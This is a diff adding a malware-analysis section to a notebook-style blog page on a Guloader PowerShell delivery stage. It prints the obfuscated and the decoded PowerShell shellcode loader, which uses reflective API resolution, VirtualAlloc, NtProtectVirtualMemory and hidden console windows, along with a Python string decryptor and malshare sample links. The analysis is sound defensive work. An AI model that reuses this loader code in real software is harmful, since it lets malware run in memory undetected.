@@ -79,7 +79,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      1 min read
+      4 min read
     
 </span></p>
 
@@ -155,6 +155,21 @@ window.onload = wrap_img;
 <ul>
 <li class="toc-entry toc-h3"><a href="#Stage-1">Stage 1 </a></li>
 <li class="toc-entry toc-h3"><a href="#Stage-2">Stage 2 </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#Guloader-Deliver-(PowerShell)">Guloader Deliver (PowerShell) </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#Sample">Sample </a></li>
+<li class="toc-entry toc-h3"><a href="#Overview">Overview </a></li>
+<li class="toc-entry toc-h3"><a href="#Analysis">Analysis </a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#Stage-1">Stage 1 </a></li>
+<li class="toc-entry toc-h4"><a href="#Stage-2">Stage 2 </a></li>
+<li class="toc-entry toc-h4"><a href="#Stage-3">Stage 3 </a></li>
+<li class="toc-entry toc-h4"><a href="#Shellcode-Loader">Shellcode Loader </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h3"><a href="#Stage-4---Shellcode-Buffer-1">Stage 4 - Shellcode Buffer 1 </a></li>
 </ul>
 </li>
 </ul><!--
@@ -570,6 +585,241 @@ window.onload = wrap_img;
 </div>
     
 
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Guloader-Deliver-(PowerShell)">
+<a class="anchor" href="#Guloader-Deliver-(PowerShell)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Guloader Deliver (PowerShell)<a class="anchor-link" href="#Guloader-Deliver-(PowerShell)"> </a>
+</h2>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Sample">
+<a class="anchor" href="#Sample" aria-hidden="true"><span class="octicon octicon-link"></span></a>Sample<a class="anchor-link" href="#Sample"> </a>
+</h3>
+<p><code>54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae</code> <a href="https://malshare.com/sample.php?action=detail&amp;hash=54976a776a08ddd4ab7cf1fb6b00c4a23f931f1a7d1d937922169ef3be7c9cae">malshare</a></p>
+<h3 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h3>
+<p>This sample also uses NSIS installer but instead of loading shellcode directly from the NSIS script they add an intermediate stage with PowerShell to further obfuscate the loader.</p>
+<h3 id="Analysis">
+<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
+</h3>
+<h4 id="Stage-1">
+<a class="anchor" href="#Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 1<a class="anchor-link" href="#Stage-1"> </a>
+</h4>
+<p>Stage one is the NSIS script which is used to launch and obfuscated powershell script in the <code>Soothsaying.For</code> file. The script can be found on ghostbin <a href="https://www.klgrth.io/paste/h2vm4">here</a></p>
+<h4 id="Stage-2">
+<a class="anchor" href="#Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2<a class="anchor-link" href="#Stage-2"> </a>
+</h4>
+<p>The obfuscated powershell contains a 3rd stage obfuscated powershell command in a variable that is deobfuscated and launched. We circomvented this by replacing the <code>IEX</code> execute commands with <code>Write-Output</code> print statements.</p>
+<h4 id="Stage-3">
+<a class="anchor" href="#Stage-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 3<a class="anchor-link" href="#Stage-3"> </a>
+</h4>
+<p>The obfuscatd powershell 3rd stage contains multiple encrypted strings which we have decrypted below.</p>
+
+</div>
+</div>
+</div>
+    
+    
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">ps_data</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">Function HTB {        param([String]$Humanmummy152);</span>
+<span class="s1">        $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2);</span>
+<span class="s1">        For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){                </span>
+<span class="s1">            $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16);</span>
+<span class="s1">            $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141);</span>
+<span class="s1">        }       [String][System.Text.Encoding]::ASCII.GetString($Sprjtende);</span>
+<span class="s1">}$Fitchet0=HTB 'DEF4FEF9E8E0A3E9E1E1';</span>
+<span class="s1">$Fitchet1=HTB 'C0E4EEFFE2FEE2EBF9A3DAE4E3BEBFA3D8E3FEECEBE8C3ECF9E4FBE8C0E8F9E5E2E9FE';</span>
+<span class="s1">$Fitchet2=HTB 'CAE8F9DDFFE2EECCE9E9FFE8FEFE';</span>
+<span class="s1">$Fitchet3=HTB 'DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EB';</span>
+<span class="s1">$Fitchet4=HTB 'FEF9FFE4E3EA';</span>
+<span class="s1">$Fitchet5=HTB 'CAE8F9C0E2E9F8E1E8C5ECE3E9E1E8';</span>
+<span class="s1">$Fitchet6=HTB 'DFD9DEFDE8EEE4ECE1C3ECE0E8A1ADC5E4E9E8CFF4DEE4EAA1ADDDF8EFE1E4EE';</span>
+<span class="s1">$Fitchet7=HTB 'DFF8E3F9E4E0E8A1ADC0ECE3ECEAE8E9';</span>
+<span class="s1">$Fitchet8=HTB 'DFE8EBE1E8EEF9E8E9C9E8E1E8EAECF9E8';</span>
+<span class="s1">$Fitchet9=HTB 'C4E3C0E8E0E2FFF4C0E2E9F8E1E8';</span>
+<span class="s1">$udvalgsprocedure0=HTB 'C0F4C9E8E1E8EAECF9E8D9F4FDE8';</span>
+<span class="s1">$udvalgsprocedure1=HTB 'CEE1ECFEFEA1ADDDF8EFE1E4EEA1ADDEE8ECE1E8E9A1ADCCE3FEE4CEE1ECFEFEA1ADCCF8F9E2CEE1ECFEFE';</span>
+<span class="s1">$udvalgsprocedure2=HTB 'C4E3FBE2E6E8';</span>
+<span class="s1">$udvalgsprocedure3=HTB 'DDF8EFE1E4EEA1ADC5E4E9E8CFF4DEE4EAA1ADC3E8FADEE1E2F9A1ADDBE4FFF9F8ECE1';</span>
+<span class="s1">$udvalgsprocedure4=HTB 'DBE4FFF9F8ECE1CCE1E1E2EE';</span>
+<span class="s1">$udvalgsprocedure5=HTB 'E3F9E9E1E1';</span>
+<span class="s1">$udvalgsprocedure6=HTB 'C3F9DDFFE2F9E8EEF9DBE4FFF9F8ECE1C0E8E0E2FFF4';</span>
+<span class="s1">$udvalgsprocedure7=HTB 'C4C8D5';</span>
+<span class="s1">$udvalgsprocedure8=HTB 'D1';</span>
+<span class="s1">Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7;</span>
+<span class="s1">function fkp {Param ($Ries, $Negeringsfunktionens)     ;</span>
+<span class="s1">$Kabar0 =HTB 'A9D8E3ECEFE9E4EEECF9E4FBE8ADB0ADA5D6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3CAE8F9CCFEFEE8E0EFE1E4E8FEA5A4ADF1ADDAE5E8FFE8A0C2EFE7E8EEF9ADF6ADA9D2A3CAE1E2EFECE1CCFEFEE8E0EFE1F4CEECEEE5E8ADA0CCE3E9ADA9D2A3C1E2EEECF9E4E2E3A3DEFDE1E4F9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B5A4D6A0BCD0A3C8FCF8ECE1FEA5A9CBE4F9EEE5E8F9BDA4ADF0A4A3CAE8F9D9F4FDE8A5A9CBE4F9EEE5E8F9BCA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar0;</span>
+<span class="s1">$Kabar5 = HTB 'A9DEFDE4E9FEE5ECE0E0E8FFE8FEADB0ADA9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9BFA1ADD6D9F4FDE8D6D0D0ADCDA5A9CBE4F9EEE5E8F9BEA1ADA9CBE4F9EEE5E8F9B9A4A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar5;</span>
+<span class="s1">$Kabar1 = HTB 'FFE8F9F8FFE3ADA9DEFDE4E9FEE5ECE0E0E8FFE8FEA3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5D6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBD0A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C5ECE3E9E1E8DFE8EBA5A5C3E8FAA0C2EFE7E8EEF9ADC4E3F9DDF9FFA4A1ADA5A9D8E3ECEFE9E4EEECF9E4FBE8A3CAE8F9C0E8F9E5E2E9A5A9CBE4F9EEE5E8F9B8A4A4A3C4E3FBE2E6E8A5A9E3F8E1E1A1ADCDA5A9DFE4E8FEA4A4A4A4A1ADA9C3E8EAE8FFE4E3EAFEEBF8E3E6F9E4E2E3E8E3FEA4A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar1;</span>
+<span class="s1">}function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]);</span>
+<span class="s1">$Kabar2 = HTB 'A9CFE2FFE3E8E2ADB0ADD6CCFDFDC9E2E0ECE4E3D0B7B7CEF8FFFFE8E3F9C9E2E0ECE4E3A3C9E8EBE4E3E8C9F4E3ECE0E4EECCFEFEE8E0EFE1F4A5A5C3E8FAA0C2EFE7E8EEF9ADDEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CCFEFEE8E0EFE1F4C3ECE0E8A5A9CBE4F9EEE5E8F9B5A4A4A1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3C8E0E4F9A3CCFEFEE8E0EFE1F4CFF8E4E1E9E8FFCCEEEEE8FEFED0B7B7DFF8E3A4A3C9E8EBE4E3E8C9F4E3ECE0E4EEC0E2E9F8E1E8A5A9CBE4F9EEE5E8F9B4A1ADA9EBECE1FEE8A4A3C9E8EBE4E3E8D9F4FDE8A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BDA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BCA1ADD6DEF4FEF9E8E0A3C0F8E1F9E4EEECFEF9C9E8E1E8EAECF9E8D0A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar2;</span>
+<span class="s1">$Kabar3 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8CEE2E3FEF9FFF8EEF9E2FFA5A9CBE4F9EEE5E8F9BBA1ADD6DEF4FEF9E8E0A3DFE8EBE1E8EEF9E4E2E3A3CEECE1E1E4E3EACEE2E3FBE8E3F9E4E2E3FED0B7B7DEF9ECE3E9ECFFE9A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar3;</span>
+<span class="s1">$Kabar4 = HTB 'A9CFE2FFE3E8E2A3C9E8EBE4E3E8C0E8F9E5E2E9A5A9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BFA1ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8BEA1ADA9C0ECE1E0F4A1ADA9CCE0EFE4E1ECE8FBE2F8FEA4A3DEE8F9C4E0FDE1E8E0E8E3F9ECF9E4E2E3CBE1ECEAFEA5A9CBE4F9EEE5E8F9BAA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar4;</span>
+<span class="s1">$Kabar5 = HTB 'FFE8F9F8FFE3ADA9CFE2FFE3E8E2A3CEFFE8ECF9E8D9F4FDE8A5A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar5   ;</span>
+<span class="s1">}$Nonperforated = HTB 'E6E8FFE3E8E1BEBF';</span>
+<span class="s1">$Brndselsforbrug = HTB 'F8FEE8FFBEBF';</span>
+<span class="s1">$Sottishness03 = HTB 'CAE8F9CEE2E3FEE2E1E8DAE4E3E9E2FA';</span>
+<span class="s1">$Sottishness00=HTB 'DEE5E2FADAE4E3E9E2FA';</span>
+<span class="s1">$Kabar6 = HTB 'A9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9F8E9FBECE1EAFEFDFFE2EEE8E9F8FFE8B9A4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar6;</span>
+<span class="s1">$Sottishness01 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9CFFFE3E9FEE8E1FEEBE2FFEFFFF8EAADA9DEE2F9F9E4FEE5E3E8FEFEBDBDA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A1ADD6D8C4E3F9BEBFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
+<span class="s1">udvalgsprocedure9 $Sottishness01;</span>
+<span class="s1">$Sottishness02 = HTB 'A9C9E2FAE3EEFFE4E8E9ADB0ADD6DEF4FEF9E8E0A3DFF8E3F9E4E0E8A3C4E3F9E8FFE2FDDEE8FFFBE4EEE8FEA3C0ECFFFEE5ECE1D0B7B7CAE8F9C9E8E1E8EAECF9E8CBE2FFCBF8E3EEF9E4E2E3DDE2E4E3F9E8FFA5A5EBE6FDADA9C3E2E3FDE8FFEBE2FFECF9E8E9ADA9DEE2F9F9E4FEE5E3E8FEFEBDBEA4A1ADA5CAC9D9ADCDA5D6C4E3F9DDF9FFD0A4ADA5D6C4E3F9DDF9FFD0A4A4A4';</span>
+<span class="s1">udvalgsprocedure9 $Sottishness02;</span>
+<span class="s1">$Kabar7 = HTB 'A9D8E3EEF8E1F9E4FBECEFE1E8ADB0ADA9C9E2FAE3EEFFE4E8E9A3C4E3FBE2E6E8A5BDA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar7;</span>
+<span class="s1">$Kabar7 = HTB 'A9E3E2E3E9E4FDF9E8FFE2F8FEA3C4E3FBE2E6E8A5A9D8E3EEF8E1F9E4FBECEFE1E8A1ADBDA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar7;</span>
+<span class="s1">$Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6;</span>
+<span class="s1">$Kabar7 = HTB 'A9CEECFEF8E4FEF9E4EEECE1E1F4BEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBEBCBBA1ADBDF5BEBDBDBDA1ADBDF5B9BDA4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar7;</span>
+<span class="s1">$Kabar8 = HTB 'A9D8E3FEECE4E3F9E1E4E3E8FEFEADB0ADA9E7E2FFE9EBE2FFE9E8E1E4E3EAE8FFE3E8FEA3C4E3FBE2E6E8A5D6C4E3F9DDF9FFD0B7B7D7E8FFE2A1ADBDF5BCBDBDBDBDBDA1ADBDF5BEBDBDBDA1ADBDF5B9A4';</span>
+<span class="s1">udvalgsprocedure9 $Kabar8;</span>
+<span class="s1">$Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr"</span>
+<span class="s1">'''</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">tmp_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">tmp_data</span><span class="p">:</span>
+        <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+
+<span class="n">egg</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">"HTB '([^']*)'"</span>
+
+<span class="n">str_map</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">egg</span><span class="p">,</span> <span class="n">ps_data</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">ptxt_data</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">141</span><span class="p">)</span>
+    <span class="n">str_map</span><span class="p">[</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">()]</span> <span class="o">=</span> <span class="n">ptxt_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">str_map</span><span class="p">:</span>
+    <span class="n">ps_data</span> <span class="o">=</span> <span class="n">ps_data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="s2">"'"</span> <span class="o">+</span> <span class="n">str_map</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"'"</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">ps_data</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+<div class="output_wrapper">
+<div class="output">
+
+<div class="output_area">
+
+<div class="output_subarea output_stream output_stdout output_text">
+<pre>
+Function HTB {        param([String]$Humanmummy152);
+        $Sprjtende = New-Object byte[] ($Humanmummy152.Length / 2);
+        For($Stuphe=0; $Stuphe -lt $Humanmummy152.Length; $Stuphe+=2){                
+            $Sprjtende[$Stuphe/2] = [convert]::ToByte($Humanmummy152.Substring($Stuphe, 2), 16);
+            $Sprjtende[$Stuphe/2] = ($Sprjtende[$Stuphe/2] -bxor 141);
+        }       [String][System.Text.Encoding]::ASCII.GetString($Sprjtende);
+}$Fitchet0='System.dll';
+$Fitchet1='Microsoft.Win32.UnsafeNativeMethods';
+$Fitchet2='GetProcAddress';
+$Fitchet3='System.Runtime.InteropServices.HandleRef';
+$Fitchet4='string';
+$Fitchet5='GetModuleHandle';
+$Fitchet6='RTSpecialName, HideBySig, Public';
+$Fitchet7='Runtime, Managed';
+$Fitchet8='ReflectedDelegate';
+$Fitchet9='InMemoryModule';
+$udvalgsprocedure0='MyDelegateType';
+$udvalgsprocedure1='Class, Public, Sealed, AnsiClass, AutoClass';
+$udvalgsprocedure2='Invoke';
+$udvalgsprocedure3='Public, HideBySig, NewSlot, Virtual';
+$udvalgsprocedure4='VirtualAlloc';
+$udvalgsprocedure5='ntdll';
+$udvalgsprocedure6='NtProtectVirtualMemory';
+$udvalgsprocedure7='IEX';
+$udvalgsprocedure8='\';
+Set-Alias -name udvalgsprocedure9 -value $udvalgsprocedure7;
+function fkp {Param ($Ries, $Negeringsfunktionens)     ;
+$Kabar0 ='$Unabdicative = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split($udvalgsprocedure8)[-1].Equals($Fitchet0) }).GetType($Fitchet1)';
+udvalgsprocedure9 $Kabar0;
+$Kabar5 = '$Spidshammeres = $Unabdicative.GetMethod($Fitchet2, [Type[]] @($Fitchet3, $Fitchet4))';
+udvalgsprocedure9 $Kabar5;
+$Kabar1 = 'return $Spidshammeres.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($Unabdicative.GetMethod($Fitchet5)).Invoke($null, @($Ries)))), $Negeringsfunktionens))';
+udvalgsprocedure9 $Kabar1;
+}function GDT {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Ambilaevous,[Parameter(Position = 1)] [Type] $Malmy = [Void]);
+$Kabar2 = '$Borneo = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($Fitchet8)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule($Fitchet9, $false).DefineType($udvalgsprocedure0, $udvalgsprocedure1, [System.MulticastDelegate])';
+udvalgsprocedure9 $Kabar2;
+$Kabar3 = '$Borneo.DefineConstructor($Fitchet6, [System.Reflection.CallingConventions]::Standard, $Ambilaevous).SetImplementationFlags($Fitchet7)';
+udvalgsprocedure9 $Kabar3;
+$Kabar4 = '$Borneo.DefineMethod($udvalgsprocedure2, $udvalgsprocedure3, $Malmy, $Ambilaevous).SetImplementationFlags($Fitchet7)';
+udvalgsprocedure9 $Kabar4;
+$Kabar5 = 'return $Borneo.CreateType()';
+udvalgsprocedure9 $Kabar5   ;
+}$Nonperforated = 'kernel32';
+$Brndselsforbrug = 'user32';
+$Sottishness03 = 'GetConsoleWindow';
+$Sottishness00='ShowWindow';
+$Kabar6 = '$jordfordelingernes = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Nonperforated $udvalgsprocedure4), (GDT @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))';
+udvalgsprocedure9 $Kabar6;
+$Sottishness01 = '$nondipterous = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Brndselsforbrug $Sottishness00), (GDT @([IntPtr], [UInt32]) ([IntPtr])))';
+udvalgsprocedure9 $Sottishness01;
+$Sottishness02 = '$Downcried = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fkp $Nonperforated $Sottishness03), (GDT @([IntPtr]) ([IntPtr])))';
+udvalgsprocedure9 $Sottishness02;
+$Kabar7 = '$Uncultivable = $Downcried.Invoke(0)';
+udvalgsprocedure9 $Kabar7;
+$Kabar7 = '$nondipterous.Invoke($Uncultivable, 0)';
+udvalgsprocedure9 $Kabar7;
+$Sottishness04 = fkp $udvalgsprocedure5 $udvalgsprocedure6;
+$Kabar7 = '$Casuistically3 = $jordfordelingernes.Invoke([IntPtr]::Zero, 316, 0x3000, 0x40)';
+udvalgsprocedure9 $Kabar7;
+$Kabar8 = '$Unsaintliness = $jordfordelingernes.Invoke([IntPtr]::Zero, 0x100000, 0x3000, 0x4)';
+udvalgsprocedure9 $Kabar8;
+$Casuistically2="rgmlfaelooallpmlvlnvuislrreellesglrrslrndsrfooorrtyvenaudpoubrpdgaaaslraoddernnoanlergpaeyeefaonoaiitiiuahhglkkaedazrrafrecrcieennipurralanidnkeueraeapeaoaoeofrreevlrxuutefyinuireraanslealiieaaodrrclieeiuauraorreeoeboeojjluricahanieasaneueuaeleohnmriarlioaaegtralioleraonearouvoieobohrveneeaafodeiiitinotdieieplaleeideoooeaaorrntiaiaotopnehekeatlriovaaadlnaoionauitinuaalnrevioeeetspnleeenoloeeeouuinrpuaijojoaovaoarroyopoaynupnoamouamsmpdundpuoinruuraroyanrsenifeaeuopernoeiilauhcricaokcarodvoorbaioelcloauemaauuijtlrrrntaarreaoutneayenpkrwieeokenleioeerkoseeouapauunoleydriakeaexaneeupiuhaiovantesneoeuaaaigyokhieoiroarueivuoetnliisnunyeiaupogylhieetuaoutejdioleakriiaaeheaictaeuaeonutlexseosfkoaeeepknkrnpueeaoeiuamyhvenpluoymohaauoiyaostiuindklaeyapeayloaoaasnyehoorerpeevraooiietoaaeeooieloiirsayadnaeaaaiftrooidvalauieaeearnonaevuuyaerelkoaduecoayonsaroieueiaiiovunriisolkosuaaroeayiuoiiaureeyatdnureafnnaevhnhaitlryrrkupuofbmrrpiunnuakarkalohnuoudeyriegnrdejivnonnnkevruugeoeleoanalahsaoylapenujpiueemiieuludkudeeesloreieeleiaarlaohvnouarurlveurrorumetnvnpruinnhremoleiikooialteieersidbpigneuoprloelyvooyavennipaaiepafenokaeiaeraeteiweoevgakrouaktatilsunqleoefnugiaevaeamnuarnoiinelr"
+
+</pre>
+</div>
+</div>
+
+</div>
+</div>
+
+</div>
+    
+
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h4 id="Shellcode-Loader">
+<a class="anchor" href="#Shellcode-Loader" aria-hidden="true"><span class="octicon octicon-link"></span></a>Shellcode Loader<a class="anchor-link" href="#Shellcode-Loader"> </a>
+</h4>
+<p>Once the strings have been decrypted it is clear that the powershell is used to read shellcode from the <code>Semiskilled.Slv</code> file. This code is split at 0x400 and 0x53c and copied into two allocated buffers. The first buffer is then called and the second buffer passed as an argument along with a pointer to <code>NtProtectVirtualMemory</code>.</p>
+<h3 id="Stage-4---Shellcode-Buffer-1">
+<a class="anchor" href="#Stage-4---Shellcode-Buffer-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 4 - Shellcode Buffer 1<a class="anchor-link" href="#Stage-4---Shellcode-Buffer-1"> </a>
+</h3>
+<p>The first shellcode buffer can be found on malshare <a href="https://malshare.com/sample.php?action=detail&amp;hash=84087a23b64f5eef5e0f08457645db07f8b90beff391715f0e8cae7172a3510b">here</a> and the second shellcode buffer (passed as an argument) can be found on malshare <a href="https://malshare.com/sample.php?action=detail&amp;hash=fd7656b8088de9c18b5edf1c36f7d9c9c7e1b8cef931f2b05ea93c5271546b8b">here</a>.</p>
+<p><strong>analysis TBD</strong></p>
+
+</div>
+</div>
+</div>
 </div>
 
 
